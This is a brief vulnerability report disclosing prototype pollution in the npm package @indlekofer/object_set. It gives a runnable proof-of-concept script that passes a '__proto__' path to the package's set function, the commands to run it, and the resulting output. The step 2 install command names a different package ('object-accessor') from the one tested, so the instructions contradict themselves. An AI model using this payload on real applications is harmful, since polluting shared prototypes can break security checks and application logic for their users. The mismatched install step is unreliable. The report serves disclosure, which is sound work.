# Description

Prototype Pollution in @indlekofer/object_set

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var objectSet = require("@indlekofer/object_set")
var obj = {}
console.log("Before : " + {}.polluted);
objectSet.default(obj,["__proto__","polluted"],"Yes! Its Polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i object-accessor # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
